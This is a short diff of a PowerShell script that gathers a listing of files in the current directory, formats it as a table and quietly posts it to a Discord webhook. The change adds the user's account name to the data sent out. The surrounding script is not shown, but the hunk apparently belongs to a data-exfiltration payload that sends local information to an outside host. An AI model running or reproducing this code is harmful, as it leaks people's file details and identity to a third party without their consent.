@@ -14,7 +14,8 @@ $r = Get-ChildItem | ForEach-Object {
 }
 
 # Format the custom object as a table in a Markdown code block
-$body = @{content = "``````"+($r | Format-Table | Out-String)+"``````"}
+$body = @{'username' = $env:username
+content = "``````"+($r | Format-Table | Out-String)+"``````"}
 
 # Send the formatted table to a Discord webhook
 Invoke-RestMethod -Uri $discord -Method 'post' -Body $body >$null;
